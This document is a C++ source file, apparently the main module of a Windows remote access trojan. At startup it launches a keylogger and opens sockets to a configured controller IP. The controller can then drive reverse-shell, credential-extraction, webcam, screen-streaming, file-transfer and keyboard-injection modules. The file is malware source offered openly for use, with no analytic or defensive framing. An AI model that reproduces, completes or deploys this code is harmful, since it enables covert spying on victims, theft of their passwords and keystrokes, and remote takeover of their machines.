#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include <mutex>
#include <cstring>
#include <random>
#include "Stream.h"
#include "Download.h"
#include "FileManager.h"
#include "SystemInformation.h"
#include "NetworkInformation.h"
#include "ReverseShell.h"
#include "KeyboardExecuter.h"
#include "Permission.h"
#include "MessageBoxGUI.h"
#include "SystemState.h"
#include "Install.h"
#include "configuration.h"
#include "ThreadGen.h"
#include "WebcamManager.h"
#include "ScreenStreamer.h"
#include "json.hpp"
#include "CredentialsExtractor.h"
#include "ConnectionState.h"


std::map<std::string, std::shared_ptr<Stream>> connections;
std::mutex connections_mutex;

std::vector<std::string> socket_conf_list = {"MAIN",
                                             "FILE_MANAGER",
                                             "DOWNLOAD_UPLOAD",
                                             "REVERSE_SHELL",
                                             "KEYLOGGER",
                                             "PERMISSION",
                                             "WEBCAM",
                                             "SCREEN",
                                             "SCREEN_EVENT",
                                             "CREDENTIALS"};

void add_connection(const std::string &key, Stream &stream) {
    std::lock_guard<std::mutex> lock(connections_mutex);
    std::shared_ptr<Stream> shared_stream = std::make_shared<Stream>(stream);
    connections[key] = shared_stream;
}

std::shared_ptr<Stream> get_connection(const std::string &key) {
    std::lock_guard<std::mutex> lock(connections_mutex);
    return connections[key];
}


bool generate_sockets() {
    std::string uniqueUUID = MUTEX;
    WSADATA WSAData;
    if (WSAStartup(MAKEWORD(2, 0), &WSAData) != 0) {
        std::cerr << "Failed to initialize WinSock" << std::endl;
        return false;
    }

    SOCKADDR_IN sin;
    sin.sin_addr.s_addr = inet_addr(IP);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    for (const auto &i: socket_conf_list) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }

        if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) == SOCKET_ERROR) {
            std::cerr << "Failed to connect socket" << std::endl;
            closesocket(sock);
            return false;
        }

        Stream stream(sock);
        stream.readString();
        nlohmann::json jsonObjet;
        jsonObjet["UUID"] = uniqueUUID;
        jsonObjet["socket_type"] = i.c_str();
        stream.sendString(jsonObjet.dump().c_str());
        if (stream.readString() != "OK") {
            closesocket(sock);
            return false;
        }

        add_connection(i, stream);
        std::cout << "new connection created" << std::endl;
    }


    return true;
}


int main(int argc = 0, char *argv[] = nullptr) {
    Sleep(argc);
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
//#ifdef KEYLOGGER_DEF
        KeyLogger keyLogger(Stream(0));
        keyLogger.tryStart();
//#endif
        //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
        bool isConnecting = true;
        bool streamListening = true;
        while (isConnecting) {
            nlohmann::json jsonObject;
            std::cout << "trying to connect " << std::endl;
            generate_sockets();
            ThreadGen threadGen;
            Stream stream = *get_connection("FILE_MANAGER");
            FileManager fileManager(stream);
            stream = *get_connection("DOWNLOAD_UPLOAD");
            Download download(stream);
            stream = *get_connection("REVERSE_SHELL");
            ReverseShell reverseShell(stream);
            stream = *get_connection("KEYLOGGER");
            keyLogger.setStream(stream);
            stream = *get_connection("PERMISSION");
            Permission permission(stream);
            stream = *get_connection("WEBCAM");
            DeviceEnumerator deviceEnumerator(stream);
            WebcamManager webcamManager(stream);
            stream = *get_connection("SCREEN");
            Stream altStream = *get_connection("SCREEN_EVENT");
            ScreenStreamer screenStreamer(stream, altStream);
            stream = *get_connection("CREDENTIALS");
            CredentialsExtractor credentialsExtractor(stream);
            stream = *get_connection("MAIN");
            MessageBoxGUI messageBoxGUI(stream);
            KeyboardExecuter keyboardExecuter(stream);
            SystemInformation sysInfo(stream);
            NetworkInformation networkInfo(stream);
            ConnectionState connectionState(stream, isConnecting,streamListening);


            std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
            actionMap["CONN_STATE"] = [&](nlohmann::json &json) { connectionState.managerMenu(json); };
            actionMap["FILE_MANAGER"] = [&](nlohmann::json &json) { fileManager.managerMenu(json); };
            actionMap["SYSTEM_INFORMATION"] = [&](nlohmann::json &json) { sysInfo.send(); };
            actionMap["NETWORK_INFORMATION"] = [&](nlohmann::json &json) { networkInfo.send(); };
            actionMap["KEYLOGGER"] = [&](nlohmann::json &json) { keyLogger.managerMenu(json); };
            actionMap["UP_DO_LOADER"] = [&](nlohmann::json &json) { download.managerMenu(json); };
            actionMap["REVERSE_SHELL"] = [&](nlohmann::json &json) { reverseShell.managerMenu(json); };
            actionMap["CREDENTIALS"] = [&](nlohmann::json &json) { credentialsExtractor.managerMenu(json); };
            actionMap["WEBCAM"] = [&](nlohmann::json &json) { webcamManager.managerMenu(json); };
            actionMap["SCREEN"] = [&](nlohmann::json &json) { screenStreamer.managerMenu(json); };
            actionMap["DEV_ENUM"] = [&](nlohmann::json &json) { deviceEnumerator.managerMenu(json); };
            actionMap["KEYBOARD"] = [&](nlohmann::json &json) { keyboardExecuter.managerMenu(json); };
            actionMap["PERMISSION"] = [&](nlohmann::json &json) { permission.managerMenu(json); };
            actionMap["BOX_MESSAGE"] = [&](nlohmann::json &json) { messageBoxGUI.managerMenu(json); };
            actionMap["SYSTEM_STATE"] = [&](nlohmann::json &json) { SystemState::setState(json); };

            while (streamListening) {
                jsonObject = nlohmann::json::parse(stream.readString());
                std::string action = jsonObject["SECTOR"];
                std::cout << "Sector: " << action << std::endl;
                auto it = actionMap.find(action);
                if (it != actionMap.end()) {
                    it->second(jsonObject);
                } else {
                    std::cout << "SECTOR NOT FOUND :(" << std::endl;
                }
            }
            // TODO FIX CLOSING
            //closesocket(sock);
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }
    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;
}
